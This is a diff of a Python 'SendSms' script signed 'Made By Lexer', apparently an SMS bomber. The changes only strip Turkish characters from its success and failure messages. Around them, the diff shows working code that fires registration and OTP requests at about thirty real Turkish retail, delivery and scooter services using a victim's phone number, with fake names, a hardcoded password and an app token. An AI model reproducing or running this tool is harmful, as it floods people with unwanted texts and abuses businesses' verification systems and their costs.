@@ -23,12 +23,12 @@ class SendSms():
                 "token_type": "register_token"
             })
             if len(kahve_dunyasi.json()["meta"]["messages"]["error"]) == 0:
-                print(f"{Fore.LIGHTGREEN_EX}Made By Lexer | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> core.kahvedunyasi.com")
+                print(f"{Fore.LIGHTGREEN_EX}Made By Lexer | [+] {Style.RESET_ALL}Basarili! {self.phone} --> core.kahvedunyasi.com")
                 self.adet += 1
             else:
                 raise
         except:    
-            print(f"{Fore.LIGHTRED_EX}Made By Lexer | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> core.kahvedunyasi.com")
+            print(f"{Fore.LIGHTRED_EX}Made By Lexer | [-] {Style.RESET_ALL}Basarisiz! {self.phone} --> core.kahvedunyasi.com")
         
      
     #wmf.com.tr
@@ -46,12 +46,12 @@ class SendSms():
                 "phone": f"0{self.phone}"
             })
             if wmf.status_code == 202:
-                print(f"{Fore.LIGHTGREEN_EX}Made By Lexer | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> wmf.com.tr")
+                print(f"{Fore.LIGHTGREEN_EX}Made By Lexer | [+] {Style.RESET_ALL}Basarili! {self.phone} --> wmf.com.tr")
                 self.adet += 1   
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}Made By Lexer | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> wmf.com.tr")
+            print(f"{Fore.LIGHTRED_EX}Made By Lexer | [-] {Style.RESET_ALL}Basarisiz! {self.phone} --> wmf.com.tr")
     
     
     #bim
@@ -59,12 +59,12 @@ class SendSms():
         try:
             bim = requests.post("https://bim.veesk.net:443/service/v1.0/account/login",  json={"phone": self.phone})
             if bim.status_code == 200:
-                print(f"{Fore.LIGHTGREEN_EX}Made By Lexer | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> bim.veesk.net")
+                print(f"{Fore.LIGHTGREEN_EX}Made By Lexer | [+] {Style.RESET_ALL}Basarili! {self.phone} --> bim.veesk.net")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}Made By Lexer | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> bim.veesk.net")
+            print(f"{Fore.LIGHTRED_EX}Made By Lexer | [-] {Style.RESET_ALL}Basarisiz! {self.phone} --> bim.veesk.net")
 
 
     #englishhome.com
@@ -73,12 +73,12 @@ class SendSms():
             data = {"first_name": "Memati", "last_name": "Bas", "email": self.mail, "phone": f"0{self.phone}", "password": "31ABC..abc31", "email_allowed": "true", "sms_allowed": "true", "confirm": "true", "tom_pay_allowed": "true"}
             home = requests.post("https://www.englishhome.com:443/enh_app/users/registration/", data=data)
             if home.status_code == 202:
-                print(f"{Fore.LIGHTGREEN_EX}Made By Lexer | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> englishhome.com")
+                print(f"{Fore.LIGHTGREEN_EX}Made By Lexer | [+] {Style.RESET_ALL}Basarili! {self.phone} --> englishhome.com")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}Made By Lexer | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> englishhome.com")
+            print(f"{Fore.LIGHTRED_EX}Made By Lexer | [-] {Style.RESET_ALL}Basarisiz! {self.phone} --> englishhome.com")
     
 
     #mopas.com.tr
@@ -88,12 +88,12 @@ class SendSms():
             headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0", "Accept": "text/plain, */*; q=0.01", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "X-Requested-With": "XMLHttpRequest", "Dnt": "1", "Referer": "https://mopas.com.tr/login", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Te": "trailers", "Connection": "close"}
             r = requests.get(f"https://mopas.com.tr/sms/activation?mobileNumber={self.phone}&pwd=&checkPwd=", cookies=cookies, headers=headers)
             if r.status_code == 200:
-                print(f"{Fore.LIGHTGREEN_EX}Made By Lexer | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> mopas.com.tr")
+                print(f"{Fore.LIGHTGREEN_EX}Made By Lexer | [+] {Style.RESET_ALL}Basarili! {self.phone} --> mopas.com.tr")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}Made By Lexer | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> mopas.com.tr")
+            print(f"{Fore.LIGHTRED_EX}Made By Lexer | [-] {Style.RESET_ALL}Basarisiz! {self.phone} --> mopas.com.tr")
             
 
     #icq.net
@@ -103,12 +103,12 @@ class SendSms():
             headers = {"Accept": "*/*", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "ICQ iOS #no_user_id# gu19PNBblQjCdbMU 23.1.1(124106) 15.7.7 iPhone9,4", "Accept-Language": "en-US,en;q=0.9", "Accept-Encoding": "gzip, deflate"}
             r = requests.post(url, headers=headers)
             if r.json()["response"]["statusCode"] == 200:
-                print(f"{Fore.LIGHTGREEN_EX}Made By Lexer | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> u.icq.net")
+                print(f"{Fore.LIGHTGREEN_EX}Made By Lexer | [+] {Style.RESET_ALL}Basarili! {self.phone} --> u.icq.net")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}Made By Lexer | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> u.icq.net")
+            print(f"{Fore.LIGHTRED_EX}Made By Lexer | [-] {Style.RESET_ALL}Basarisiz! {self.phone} --> u.icq.net")
           
 
     #suiste.com
@@ -119,12 +119,12 @@ class SendSms():
             data = {"action": "register", "gsm": self.phone}
             r = requests.post(url, headers=headers, data=data)
             if r.json()["code"] == "common.success":
-                print(f"{Fore.LIGHTGREEN_EX}Made By Lexer | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> suiste.com")
+                print(f"{Fore.LIGHTGREEN_EX}Made By Lexer | [+] {Style.RESET_ALL}Basarili! {self.phone} --> suiste.com")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}Made By Lexer | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> suiste.com")
+            print(f"{Fore.LIGHTRED_EX}Made By Lexer | [-] {Style.RESET_ALL}Basarisiz! {self.phone} --> suiste.com")
                 
     
     #KimGbIster
@@ -132,12 +132,12 @@ class SendSms():
         try:
             r = requests.post("https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com:443/api/auth/send-otp", json={"msisdn": f"90{self.phone}"})
             if r.status_code == 200:
-                print(f"{Fore.LIGHTGREEN_EX}Made By Lexer | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> 3uptzlakwi.execute-api.eu-west-1.amazonaws.com")
+                print(f"{Fore.LIGHTGREEN_EX}Made By Lexer | [+] {Style.RESET_ALL}Basarili! {self.phone} --> 3uptzlakwi.execute-api.eu-west-1.amazonaws.com")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}Made By Lexer | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> 3uptzlakwi.execute-api.eu-west-1.amazonaws.com")
+            print(f"{Fore.LIGHTRED_EX}Made By Lexer | [-] {Style.RESET_ALL}Basarisiz! {self.phone} --> 3uptzlakwi.execute-api.eu-west-1.amazonaws.com")
             
 
     #tazi.tech
@@ -148,12 +148,12 @@ class SendSms():
             json={"cep_tel": self.phone, "cep_tel_ulkekod": "90"}
             r = requests.post(url, headers=headers, json=json)
             if (r.json()["kod"]) == "0000":
-                print(f"{Fore.LIGHTGREEN_EX}Made By Lexer | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> mobileapiv2.tazi.tech")
+                print(f"{Fore.LIGHTGREEN_EX}Made By Lexer | [+] {Style.RESET_ALL}Basarili! {self.phone} --> mobileapiv2.tazi.tech")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}Made By Lexer | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> mobileapiv2.tazi.tech")
+            print(f"{Fore.LIGHTRED_EX}Made By Lexer | [-] {Style.RESET_ALL}Basarisiz! {self.phone} --> mobileapiv2.tazi.tech")
             
     
     #n11.com
@@ -164,12 +164,12 @@ class SendSms():
             json={"__hapc": "", "_deviceId": "696B171-031N-4131-315F-9A76BF60368F", "channel": "MOBILE_IOS", "countryCode": "+90", "email": self.mail, "gsmNumber": self.phone, "userType": "BUYER"}
             r = requests.post(url, headers=headers, json=json)
             if (r.json()["isSuccess"]) == True:
-                print(f"{Fore.LIGHTGREEN_EX}Made By Lexer | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> mobileapi.n11.com")
+                print(f"{Fore.LIGHTGREEN_EX}Made By Lexer | [+] {Style.RESET_ALL}Basarili! {self.phone} --> mobileapi.n11.com")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}Made By Lexer | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> mobileapi.n11.com")
+            print(f"{Fore.LIGHTRED_EX}Made By Lexer | [-] {Style.RESET_ALL}Basarisiz! {self.phone} --> mobileapi.n11.com")
             
     
     #evidea.com
@@ -180,12 +180,12 @@ class SendSms():
             data = f"--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"first_name\"\r\n\r\nMemati\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"last_name\"\r\n\r\nBas\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"email\"\r\n\r\n{self.mail}\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"email_allowed\"\r\n\r\nfalse\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"sms_allowed\"\r\n\r\ntrue\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"password\"\r\n\r\n31ABC..abc31\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"phone\"\r\n\r\n0{self.phone}\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"confirm\"\r\n\r\ntrue\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi--\r\n"
             r = requests.post(url, headers=headers, data=data)      
             if r.status_code == 202:
-                print(f"{Fore.LIGHTGREEN_EX}Made By Lexer | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> evidea.com")
+                print(f"{Fore.LIGHTGREEN_EX}Made By Lexer | [+] {Style.RESET_ALL}Basarili! {self.phone} --> evidea.com")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}Made By Lexer | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> evidea.com") 
+            print(f"{Fore.LIGHTRED_EX}Made By Lexer | [-] {Style.RESET_ALL}Basarisiz! {self.phone} --> evidea.com") 
             
         
     #marti.tech
@@ -195,12 +195,12 @@ class SendSms():
             json={"mobilePhone": self.phone, "mobilePhoneCountryCode": "90", "oneSignalId": ""}
             r = requests.post(url,  json=json)
             if r.json()["isSuccess"] == True:
-                print(f"{Fore.LIGHTGREEN_EX}Made By Lexer | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> customer.martiscooter.com")
+                print(f"{Fore.LIGHTGREEN_EX}Made By Lexer | [+] {Style.RESET_ALL}Basarili! {self.phone} --> customer.martiscooter.com")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}Made By Lexer | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> customer.martiscooter.com")
+            print(f"{Fore.LIGHTRED_EX}Made By Lexer | [-] {Style.RESET_ALL}Basarisiz! {self.phone} --> customer.martiscooter.com")
 
 
     #heyscooter.com.tr
@@ -210,12 +210,12 @@ class SendSms():
             headers = {"Accept": "application/json, text/plain, */*", "Accept-Encoding": "gzip, deflate", "User-Agent": "HEY!%20Scooter/143 CFNetwork/1335.0.3.2 Darwin/21.6.0", "Accept-Language": "tr"}
             r = requests.post(url, headers=headers)
             if r.json()["IsSuccess"] == True:
-                print(f"{Fore.LIGHTGREEN_EX}Made By Lexer | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> heyapi.heymobility.tech")
+                print(f"{Fore.LIGHTGREEN_EX}Made By Lexer | [+] {Style.RESET_ALL}Basarili! {self.phone} --> heyapi.heymobility.tech")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}Made By Lexer | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> heyapi.heymobility.tech")
+            print(f"{Fore.LIGHTRED_EX}Made By Lexer | [-] {Style.RESET_ALL}Basarisiz! {self.phone} --> heyapi.heymobility.tech")
 
 
     #bineq.tech
@@ -225,12 +225,12 @@ class SendSms():
             header= {"Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Accept-Encoding": "gzip, deflate", "User-Agent": "HEY!%20Scooter/128 CFNetwork/1335.0.3.2 Darwin/21.6.0", "Accept-Language": "tr"}
             r = requests.post(url, headers=header)
             if r.json()["IsSuccess"] == True:
-                print(f"{Fore.LIGHTGREEN_EX}Made By Lexer | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> bineqapi.heymobility.tech")
+                print(f"{Fore.LIGHTGREEN_EX}Made By Lexer | [+] {Style.RESET_ALL}Basarili! {self.phone} --> bineqapi.heymobility.tech")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}Made By Lexer | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> bineqapi.heymobility.tech")
+            print(f"{Fore.LIGHTRED_EX}Made By Lexer | [-] {Style.RESET_ALL}Basarisiz! {self.phone} --> bineqapi.heymobility.tech")
 
         
     #bisu.com.tr
@@ -241,12 +241,12 @@ class SendSms():
             data = {"phoneNumber": self.phone}
             r = requests.post(url, headers=headers, data=data)
             if r.json()["errors"] == None:
-                print(f"{Fore.LIGHTGREEN_EX}Made By Lexer | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> bisu.com.tr")
+                print(f"{Fore.LIGHTGREEN_EX}Made By Lexer | [+] {Style.RESET_ALL}Basarili! {self.phone} --> bisu.com.tr")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}Made By Lexer | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> bisu.com.tr")
+            print(f"{Fore.LIGHTRED_EX}Made By Lexer | [-] {Style.RESET_ALL}Basarisiz! {self.phone} --> bisu.com.tr")
 
 
     #345dijital.com
@@ -256,12 +256,12 @@ class SendSms():
             headers = {"Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Accept-Encoding": "gzip, deflate", "User-Agent": "AriPlusMobile/21 CFNetwork/1335.0.3.2 Darwin/21.6.0", "Accept-Language": "en-US,en;q=0.9", "Authorization": "null", "Connection": "close"}
             json={"email": "", "name": "Memati", "phoneNumber": f"+90{self.phone}", "surname": "Bas"}
             r = requests.post(url, headers=headers, json=json)
-            if r.json()["error"] == "E-Posta veya telefon zaten kayıtlı!":
-                print(f"{Fore.LIGHTRED_EX}Made By Lexer | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.345dijital.com")
+            if r.json()["error"] == "E-Posta veya telefon zaten kayitli!":
+                print(f"{Fore.LIGHTRED_EX}Made By Lexer | [-] {Style.RESET_ALL}Basarisiz! {self.phone} --> api.345dijital.com")
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTGREEN_EX}Made By Lexer | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.345dijital.com")
+            print(f"{Fore.LIGHTGREEN_EX}Made By Lexer | [+] {Style.RESET_ALL}Basarili! {self.phone} --> api.345dijital.com")
             self.adet += 1
 
 
@@ -273,12 +273,12 @@ class SendSms():
             json={"phoneNumber": self.phone}
             r = requests.post(url, headers=headers, json=json)
             if r.json()["successful"] == True:
-                print(f"{Fore.LIGHTGREEN_EX}Made By Lexer | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> rest.macrocenter.com.tr")
+                print(f"{Fore.LIGHTGREEN_EX}Made By Lexer | [+] {Style.RESET_ALL}Basarili! {self.phone} --> rest.macrocenter.com.tr")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}Made By Lexer | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> rest.macrocenter.com.tr")
+            print(f"{Fore.LIGHTRED_EX}Made By Lexer | [-] {Style.RESET_ALL}Basarisiz! {self.phone} --> rest.macrocenter.com.tr")
 
 
     #tiklagelsin.com
@@ -289,12 +289,12 @@ class SendSms():
             json={"operationName": "GENERATE_OTP", "query": "mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) {\n  generateOtp(phone: $phone, challenge: $challenge, deviceUniqueId: $deviceUniqueId)\n}\n", "variables": {"challenge": "3d6f9ff9-86ce-4bf3-8ba9-4a85ca975e68", "deviceUniqueId": "720932D5-47BD-46CD-A4B8-086EC49F81AB", "phone": f"+90{self.phone}"}}
             r = requests.post(url, headers=headers, json=json)
             if r.json()["data"]["generateOtp"] == True:
-                print(f"{Fore.LIGHTGREEN_EX}Made By Lexer | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> svc.apps.tiklagelsin.com")
+                print(f"{Fore.LIGHTGREEN_EX}Made By Lexer | [+] {Style.RESET_ALL}Basarili! {self.phone} --> svc.apps.tiklagelsin.com")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}Made By Lexer | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> svc.apps.tiklagelsin.com")
+            print(f"{Fore.LIGHTRED_EX}Made By Lexer | [-] {Style.RESET_ALL}Basarisiz! {self.phone} --> svc.apps.tiklagelsin.com")
     
 
     #ayyildiz.com.tr
@@ -304,12 +304,12 @@ class SendSms():
             headers = {"Accept": "*/*", "Token": "MXZ5NTJ82WXBUJB7KBP10AGR3AF6S4GB95VZDU4G44JFEIN3WISAC2KLRIBNONQ7QVCZXM3ZHI661AMVXLKJLF9HUKI5SQ2ROMZS", "Devicetype": "mobileapp", "Accept-Encoding": "gzip, deflate", "User-Agent": "altinyildiz/2.7 (com.brmagazacilik.altinyildiz; build:2; iOS 15.7.7) Alamofire/2.7", "Accept-Language": "en-TR;q=1.0, tr-TR;q=0.9"}
             r = requests.post(url, headers=headers)
             if r.json()["Success"] == True:
-                print(f"{Fore.LIGHTGREEN_EX}Made By Lexer | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.altinyildizclassics.com")
+                print(f"{Fore.LIGHTGREEN_EX}Made By Lexer | [+] {Style.RESET_ALL}Basarili! {self.phone} --> api.altinyildizclassics.com")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}Made By Lexer | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.altinyildizclassics.com")
+            print(f"{Fore.LIGHTRED_EX}Made By Lexer | [-] {Style.RESET_ALL}Basarisiz! {self.phone} --> api.altinyildizclassics.com")
 
 
     #naosstars.com
@@ -320,12 +320,12 @@ class SendSms():
             json={"telephone": f"+90{self.phone}", "type": "register"}
             r = requests.post(url, headers=headers, json=json)
             if r.status_code == 200:
-                print(f"{Fore.LIGHTGREEN_EX}Made By Lexer | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.naosstars.com")
+                print(f"{Fore.LIGHTGREEN_EX}Made By Lexer | [+] {Style.RESET_ALL}Basarili! {self.phone} --> api.naosstars.com")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}Made By Lexer | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.naosstars.com")
+            print(f"{Fore.LIGHTRED_EX}Made By Lexer | [-] {Style.RESET_ALL}Basarisiz! {self.phone} --> api.naosstars.com")
 
 
     #istegelsin.com
@@ -336,12 +336,12 @@ class SendSms():
             json={"operationName": "SendOtp2", "query": "mutation SendOtp2($phoneNumber: String!) {\n  sendOtp2(phoneNumber: $phoneNumber) {\n    __typename\n    alreadySent\n    remainingTime\n  }\n}", "variables": {"phoneNumber": f"90{self.phone}"}}
             r = requests.post(url, headers=headers, json=json)
             if r.json()["data"]["sendOtp2"]["alreadySent"] == False:
-                print(f"{Fore.LIGHTGREEN_EX}Made By Lexer | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> prod.fasapi.net")
+                print(f"{Fore.LIGHTGREEN_EX}Made By Lexer | [+] {Style.RESET_ALL}Basarili! {self.phone} --> prod.fasapi.net")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}Made By Lexer | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> prod.fasapi.net")
+            print(f"{Fore.LIGHTRED_EX}Made By Lexer | [-] {Style.RESET_ALL}Basarisiz! {self.phone} --> prod.fasapi.net")
 
 
     #koton.com
@@ -352,12 +352,12 @@ class SendSms():
             data = f"--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"first_name\"\r\n\r\nMemati\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"last_name\"\r\n\r\nBas\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"email\"\r\n\r\n{self.mail}\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"password\"\r\n\r\n31ABC..abc31\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"phone\"\r\n\r\n0{self.phone}\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"confirm\"\r\n\r\ntrue\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"sms_allowed\"\r\n\r\ntrue\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"email_allowed\"\r\n\r\ntrue\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"date_of_birth\"\r\n\r\n1993-07-02\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"call_allowed\"\r\n\r\ntrue\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"gender\"\r\n\r\n\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk--\r\n"
             r = requests.post(url, headers=headers, data=data)
             if r.status_code == 202:
-                print(f"{Fore.LIGHTGREEN_EX}Made By Lexer | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> koton.com")
+                print(f"{Fore.LIGHTGREEN_EX}Made By Lexer | [+] {Style.RESET_ALL}Basarili! {self.phone} --> koton.com")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}Made By Lexer | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> koton.com")
+            print(f"{Fore.LIGHTRED_EX}Made By Lexer | [-] {Style.RESET_ALL}Basarisiz! {self.phone} --> koton.com")
 
 
     #hayatsu.com.tr
@@ -368,12 +368,12 @@ class SendSms():
             json={"mobilePhoneNumber": self.phone}
             r = requests.post(url, headers=headers, json=json)
             if r.json()["IsSuccessful"] == True:
-                print(f"{Fore.LIGHTGREEN_EX}Made By Lexer | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> hayatsu.com.tr")
+                print(f"{Fore.LIGHTGREEN_EX}Made By Lexer | [+] {Style.RESET_ALL}Basarili! {self.phone} --> hayatsu.com.tr")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}Made By Lexer | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> hayatsu.com.tr")
+            print(f"{Fore.LIGHTRED_EX}Made By Lexer | [-] {Style.RESET_ALL}Basarisiz! {self.phone} --> hayatsu.com.tr")
 
 
     #pisir.com
@@ -384,12 +384,12 @@ class SendSms():
             json={"app_build": "386", "app_platform": "ios", "msisdn": f"+90{self.phone}"}
             r = requests.post(url, headers=headers, json=json)
             if r.json()["ok"] == "1":
-                print(f"{Fore.LIGHTGREEN_EX}Made By Lexer | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.pisir.com")
+                print(f"{Fore.LIGHTGREEN_EX}Made By Lexer | [+] {Style.RESET_ALL}Basarili! {self.phone} --> api.pisir.com")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}Made By Lexer | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.pisir.com")
+            print(f"{Fore.LIGHTRED_EX}Made By Lexer | [-] {Style.RESET_ALL}Basarisiz! {self.phone} --> api.pisir.com")
 
 
     #hizliecza.com.tr
@@ -400,12 +400,12 @@ class SendSms():
             json={"otpOperationType": 2, "phoneNumber": f"+90{self.phone}"}
             r = requests.post(url, headers=headers, json=json)
             if r.json()["isSuccess"] == True:
-                print(f"{Fore.LIGHTGREEN_EX}Made By Lexer | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> hizlieczaprodapi.hizliecza.net")
+                print(f"{Fore.LIGHTGREEN_EX}Made By Lexer | [+] {Style.RESET_ALL}Basarili! {self.phone} --> hizlieczaprodapi.hizliecza.net")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}Made By Lexer | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> hizlieczaprodapi.hizliecza.net")
+            print(f"{Fore.LIGHTRED_EX}Made By Lexer | [-] {Style.RESET_ALL}Basarisiz! {self.phone} --> hizlieczaprodapi.hizliecza.net")
 
 
     #ipragaz.com.tr
@@ -416,12 +416,12 @@ class SendSms():
             json={"birthDate": "2/7/2000", "carPlate": "31 ABC 31", "mobileOtp": "f32c79e65cc684a14b15dcb9dc7e9e9d92b2f6d269fd9000a7b75e02cfd8fa63", "name": "Memati Bas", "otp": "", "phoneNumber": self.phone, "playerId": ""}
             r = requests.post(url, headers=headers, json=json)
             if r.status_code == 200:
-                print(f"{Fore.LIGHTGREEN_EX}Made By Lexer | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> ipapp.ipragaz.com.tr")
+                print(f"{Fore.LIGHTGREEN_EX}Made By Lexer | [+] {Style.RESET_ALL}Basarili! {self.phone} --> ipapp.ipragaz.com.tr")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}Made By Lexer | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> ipapp.ipragaz.com.tr")
+            print(f"{Fore.LIGHTRED_EX}Made By Lexer | [-] {Style.RESET_ALL}Basarisiz! {self.phone} --> ipapp.ipragaz.com.tr")
 
 
     #metro-tr.com
@@ -432,12 +432,12 @@ class SendSms():
             json={"methodType": "2", "mobilePhoneNumber": f"+90{self.phone}"}
             r = requests.post(url, headers=headers, json=json)
             if r.json()["status"] == "success":
-                print(f"{Fore.LIGHTGREEN_EX}Made By Lexer | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> feature.metro-tr.com")
+                print(f"{Fore.LIGHTGREEN_EX}Made By Lexer | [+] {Style.RESET_ALL}Basarili! {self.phone} --> feature.metro-tr.com")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}Made By Lexer | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> feature.metro-tr.com")
+            print(f"{Fore.LIGHTRED_EX}Made By Lexer | [-] {Style.RESET_ALL}Basarisiz! {self.phone} --> feature.metro-tr.com")
 
 
     #kumport.com.tr
@@ -447,12 +447,12 @@ class SendSms():
